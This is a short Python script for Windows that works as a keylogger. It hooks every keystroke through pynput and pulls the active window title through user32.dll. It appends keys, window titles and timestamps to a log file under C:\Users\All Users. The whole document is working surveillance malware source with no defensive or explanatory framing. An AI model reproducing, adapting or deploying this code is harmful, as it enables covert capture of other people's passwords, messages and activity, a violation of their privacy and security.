from pynput.keyboard import Key,Listener
import ctypes, threading, os, time, getpass
    
user_name = getpass.getuser()
    
def keylogging(key):
    lib = ctypes.windll.LoadLibrary('user32.dll')
    handle = lib.GetForegroundWindow()
    buffer = ctypes.create_unicode_buffer(255)
    lib.GetWindowTextW(handle, buffer, ctypes.sizeof(buffer))
    title = str(buffer.value)
    f = open(r'C:\Users\All Users/logging.txt', 'a', encoding='UTF8')
    r = open(r'C:\Users\All Users/logging.txt', 'r', encoding='UTF8')
    sites = r.readlines()
    r.close()
    global default_site
    default_site = ''
    if sites != '':
        for j in range(0, len(sites)):
            if '[' in sites[len(sites)-j-1]:
                default_site = sites[len(sites)-j-1].strip()[1:-1]
                break
        if title == default_site:
            pass
        else:
            title = '['+title+']'
            f.write(title+'\n')
    else:
        title = '['+title+']'
        f.write(title+'\n')
    f.write(f"{str(key):<15}  |  {time.strftime('%Y-%m-%d %H:%M:%S'):<}\n")
    f.close()
    
with Listener(keylogging) as l:
    l.join()